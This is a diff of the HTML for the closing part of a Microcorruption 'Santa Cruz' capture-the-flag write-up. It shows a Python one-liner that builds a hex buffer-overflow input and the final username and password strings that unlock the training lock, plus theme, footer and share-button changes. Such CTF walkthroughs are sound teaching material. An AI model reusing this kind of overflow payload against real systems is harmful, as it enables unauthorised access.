 <div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#960050;background-color:#1e0010>$</span> python <span style=color:#f92672>-</span>c <span style=color:#e6db74>&#34;print(&#39;41&#39; * 17 + &#39;0199&#39; + &#39;44&#39; * 23 + &#39;4a44&#39;)&#34;</span>
 <span style=color:#ae81ff>4141414141414141414141414141414141019944444444444444444444444444444444444444444444444</span>a44
-</code></pre></div>
-<figure class=left>
-<img src=/images/microcorruption/santa_cruz_unlocked.png>
+</code></pre></div><figure>
+<img loading=lazy src=/images/microcorruption/santa_cruz_unlocked.png>
 </figure>
-<h2 id=solution>solution</h2>
+<h2 id=solution>solution<a hidden class=anchor aria-hidden=true href=#solution>#</a></h2>
 <p>Enter <code>41414141414141414141414141414141430199444444444444444444444444444444444444444444444444444444444444</code> as hex encoded input for the username and <code>4242424242424242424242424242424242</code> as hex encoded input for the password.</p>
-<h2 id=other-challenges>other challenges</h2>
+<h2 id=other-challenges>other challenges<a hidden class=anchor aria-hidden=true href=#other-challenges>#</a></h2>
 <p>For my other write ups in the microcorruption series, checkout <a href=https://leonjza.github.io/categories/microcorruption/>this</a> link.</p>
 </div>
-<div class=pagination>
-<div class=pagination__title>
-<span class=pagination__title-h>Read other posts</span>
-<hr>
-</div>
-<div class=pagination__buttons>
-<span class="button previous">
-<a href=https://leonjza.github.io/blog/2020/12/30/the-2020-kinglecon-3-holiday-hack-challenge/>
-<span class=button__icon>←</span>
-<span class=button__text>the 2020 kinglecon 3 holiday hack challenge</span>
+<footer class=post-footer>
+<nav class=paginav>
+<a class=prev href=https://leonjza.github.io/blog/2020/12/30/the-2020-kinglecon-3-holiday-hack-challenge/>
+<span class=title>« Prev Page</span>
+<br>
+<span>the 2020 kinglecon 3 holiday hack challenge</span>
 </a>
-</span>
-<span class="button next">
-<a href=https://leonjza.github.io/blog/2018/03/09/microcorruption-johannesburg/>
-<span class=button__text>microcorruption - johannesburg</span>
-<span class=button__icon>→</span>
+<a class=next href=https://leonjza.github.io/blog/2018/03/09/microcorruption-johannesburg/>
+<span class=title>Next Page »</span>
+<br>
+<span>microcorruption - johannesburg</span>
 </a>
-</span>
-</div>
-</div>
-</div>
-</div>
-<footer class=footer>
-<div class=footer__inner>
-<div class="copyright copyright--user"><a href=https://twitter.com/leonjza>@leonjza</a></div>
+</nav>
+<div class=share-buttons>
+<a target=_blank rel="noopener noreferrer" aria-label="share microcorruption - santa cruz on twitter" href="https://twitter.com/intent/tweet/?text=microcorruption%20-%20santa%20cruz&url=https%3a%2f%2fleonjza.github.io%2fblog%2f2018%2f03%2f11%2fmicrocorruption-santa-cruz%2f&hashtags="><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share microcorruption - santa cruz on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fleonjza.github.io%2fblog%2f2018%2f03%2f11%2fmicrocorruption-santa-cruz%2f&title=microcorruption%20-%20santa%20cruz&summary=microcorruption%20-%20santa%20cruz&source=https%3a%2f%2fleonjza.github.io%2fblog%2f2018%2f03%2f11%2fmicrocorruption-santa-cruz%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share microcorruption - santa cruz on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2018%2f03%2f11%2fmicrocorruption-santa-cruz%2f&title=microcorruption%20-%20santa%20cruz"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share microcorruption - santa cruz on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2018%2f03%2f11%2fmicrocorruption-santa-cruz%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share microcorruption - santa cruz on whatsapp" href="https://api.whatsapp.com/send?text=microcorruption%20-%20santa%20cruz%20-%20https%3a%2f%2fleonjza.github.io%2fblog%2f2018%2f03%2f11%2fmicrocorruption-santa-cruz%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg>
+</a>
+<a target=_blank rel="noopener noreferrer" aria-label="share microcorruption - santa cruz on telegram" href="https://telegram.me/share/url?text=microcorruption%20-%20santa%20cruz&url=https%3a%2f%2fleonjza.github.io%2fblog%2f2018%2f03%2f11%2fmicrocorruption-santa-cruz%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg>
+</a>
 </div>
 </footer>
-<script src=https://leonjza.github.io/assets/main.js></script>
-<script src=https://leonjza.github.io/assets/prism.js></script>
-</div>
-<script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(a,e,f,g,b,c,d){a.GoogleAnalyticsObject=b,a[b]=a[b]||function(){(a[b].q=a[b].q||[]).push(arguments)},a[b].l=1*new Date,c=e.createElement(f),d=e.getElementsByTagName(f)[0],c.async=1,c.src=g,d.parentNode.insertBefore(c,d)}(window,document,'script','https://www.google-analytics.com/analytics.js','ga'),ga('create','UA-44457032-2','auto'),ga('send','pageview'))</script>
+</article>
+</main>
+<footer class=footer>
+<span>@leonjza</span>
+<span>
+Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>
+</span>
+</footer>
+<a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
+</a>
+<script>let menu=document.getElementById('menu');menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener("click",function(b){b.preventDefault();var a=this.getAttribute("href").substr(1);window.matchMedia('(prefers-reduced-motion: reduce)').matches?document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(a)}']`).scrollIntoView({behavior:"smooth"}),a==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${a}`)})})</script>
+<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
+<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove('dark'),localStorage.setItem("pref-theme",'light')):(document.body.classList.add('dark'),localStorage.setItem("pref-theme",'dark'))})</script>
+<script>document.querySelectorAll('pre > code').forEach(b=>{const c=b.parentNode.parentNode,a=document.createElement('button');a.classList.add('copy-code'),a.innerText='copy';function d(){a.innerText='copied!',setTimeout(()=>{a.innerText='copy'},2e3)}a.addEventListener('click',e=>{if('clipboard'in navigator){navigator.clipboard.writeText(b.textContent),d();return}const a=document.createRange();a.selectNodeContents(b);const c=window.getSelection();c.removeAllRanges(),c.addRange(a);try{document.execCommand('copy'),d()}catch(a){}c.removeRange(a)}),c.classList.contains("highlight")?c.appendChild(a):c.parentNode.firstChild==c||(b.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?b.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(a):b.parentNode.appendChild(a))})</script>
 </body>
 </html>
